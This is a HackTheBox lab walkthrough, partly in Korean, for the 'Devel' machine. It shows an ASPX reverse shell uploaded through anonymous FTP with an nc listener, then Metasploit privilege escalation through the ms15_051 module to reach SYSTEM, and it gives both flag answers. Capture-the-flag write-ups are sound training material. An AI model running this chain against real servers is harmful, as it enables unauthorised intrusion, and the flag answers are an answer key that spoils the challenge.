
# HackTheBox Walkthrough - Machine: Devel

**Target IP**: 10.129.62.33  
**Difficulty**: Easy  
**Objective**: Gain system access via FTP + ASPX webshell and escalate privileges to retrieve both user and root flags.

---

## Task 1  
**Question**: What is the name of the service running on TCP port 21 on the target machine?  
**Answer**: `Microsoft ftpd`  

**Process**:
- 실행 명령:  
  ```bash
  nmap -sV -sC -oA nmap/Devel 10.129.62.33
  ```
- 결과:
  ```
  21/tcp open  ftp     Microsoft ftpd
  ```
- 익명 로그인 가능 및 기본 웹파일 존재 확인

---

## Task 2  
**Question**: Which basic FTP command can be used to upload a single file onto the server?  
**Answer**: `put`  

- FTP 세션에서 파일 업로드 시 사용됨

---

## Task 3  
**Question**: Are files put into the FTP root available via the webserver?  
**Answer**: `yes`  

- 웹서버 루트와 FTP 루트가 동일하여 업로드한 파일을 HTTP로 확인 가능

---

## Task 4  
**Question**: What file extension is executed as a script on this webserver?  
**Answer**: `aspx`  

- 서버 정보: `X-Powered-By: ASP.NET`  
- `.php` 미작동, `.aspx` 파일만 실행됨

---

## Submit User Flag

**과정**:
1. GitHub에서 ASPX 리버스 셸 다운로드  
   https://github.com/borjmz/aspx-reverse-shell
2. FTP로 업로드:  
   ```bash
   ftp> put shell.aspx
   ```
3. 리스너 대기:  
   ```bash
   nc -nlvp 9999
   ```
4. 웹 브라우저에서 접속:  
   ```
   http://10.129.62.33/shell.aspx
   ```
5. 쉘 획득 후 `user.txt` 확인:  
   ```bash
   type C:\Users\babis\Desktop\user.txt
   ```

**Answer**: `5b8faa08515e0b393c478f508f68eb70`

---

## Task 5  
**Question**: Which metasploit reconnaissance module can be used to list possible privilege escalation paths on a compromised system?  
**Answer**: `local_exploit_suggester`  

**Command**:
```bash
use post/multi/recon/local_exploit_suggester
set session 1
run
```

---

## Privilege Escalation

### 첫 번째 시도 (실패):
- 모듈: `exploit/windows/local/ms16_032_secondary_logon_handle_privesc`
- 실패

### 두 번째 시도 (성공):
- 모듈: `exploit/windows/local/ms15_051_client_copy_image`
```bash
use exploit/windows/local/ms15_051_client_copy_image
set session 1
set LHOST 10.10.14.156
run
```
- `getuid` 결과: `NT AUTHORITY\SYSTEM`

---

## Submit Root Flag

**Command**:
```bash
type C:\Users\Administrator\Desktop\root.txt
```

**Answer**: `935e27c70167f547427c88fbf04c1876`

---
